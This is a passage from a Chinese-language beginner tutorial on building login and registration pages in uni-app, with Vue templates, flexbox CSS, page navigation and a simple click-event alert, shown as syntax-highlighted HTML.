punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>Hi、请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 50vw<span class="token punctuation">;</span><span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.login_button:hover</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> aquamarine<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="20-注册页面"><a href="#20-注册页面" class="headerlink" title="20.注册页面"></a>20.注册页面</h2><p>等等，好像要先注册才能登录吧，应该先做注册页面的，这就是一开始没有梳理好开发的业务逻辑，盲目开始敲代码导致的，这就尴尬了，不，我这是故意设计的，就是为了让你感受这一点，正好让你们自己去把注册页面写出来，这是布置给你们的任务，对，就是这样。</p><p>右键pages目录，新建一个页面，默认勾选了创建同名目录，以及在pages.json中注册。（记得是新建页面，不是新建目录，因为只有新建好页面，他才会帮我们在pages.json中注册，如果它不帮我们注册，就只有我们自己注册，非常麻烦，pages.json是所有页面的配置文件，如果新页面没有在这个文件中注册，我们的项目是找不到这个页面的，就比如你如果要上大学，就必须先在教育部注册学籍）</p><p>代码我写好了，你可以参考一下，建议把那些花花绿绿的背景颜色去掉，那是为了给大家区分边界的。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>Hi、请注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>确认密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请再次输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 50vw<span class="token punctuation">;</span><span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.login_button:hover</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> aquamarine<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是改了几个字，然后加了一个输入框，因为注册需要确认密码，其实也不麻烦，两分钟就完事了。</p><h2 id="21-页面跳转"><a href="#21-页面跳转" class="headerlink" title="21.页面跳转"></a>21.页面跳转</h2><p>我们写好注册页面之后，用户怎么样才能从登录页面跳转过来呢</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 登录页面 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>navigator</span> <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/pages/signup/signup<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>没有账号，立即注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>navigator</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="22-鼠标点击事件"><a href="#22-鼠标点击事件" class="headerlink" title="22.鼠标点击事件"></a>22.鼠标点击事件</h2><p>发送请求我们要用到JavaScript了，还记得一开始我们说的吗，JavaScript应该写在什么区域里，如果忘了回头看看那张表格。<br>其实项目一开始给我们生成了一些<code>&lt;script&gt;&lt;/script&gt;</code>的结构，但是当时我们嫌烦就删了，怎么办呢，没关系，我再给你们不就完事了吗？</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Hello'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先来做一个小实验吧，我们希望点击注册按钮的时候，给我们弹出一个提示框。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 登录按钮的区域 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>signup()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Hello'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">signup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'你好'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这段代码中，我们首先给注册按钮添加了一个点击事件<code>@click="signup()"</code>，点击注册按钮会触发<code>signup()</code>事件，括号里面是空的是因为我们不需要传值，如果遇到需要传值的情况我们再说，然后我们在JavaScript中，methods表示方法事件，在这里定义各类事件具体是干什么的，同样，其他的先不管，后面我们都会用到。</p><p>我们在<code>signup()</code>方法中写了一个<code>alert('你好')</code>，这句代码的作用是弹一个对话框给我们看，内容是你好。</p><p>这是原生JavaScript的对话框，样式比较简单，现在已经很少有网站会用这么古老的对话框了，毕竟太丑了，一点都不上档次，我们接下来就教大家怎么去使用高端的对话框吧。</p><h2 id="23-API调用初体验"><a href="#23-API调用初体验" class="headerlink" title="23.API调用初体验"></a>23.API调用初体验</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 登录按钮的区域 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>signup()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Hello'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">signup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 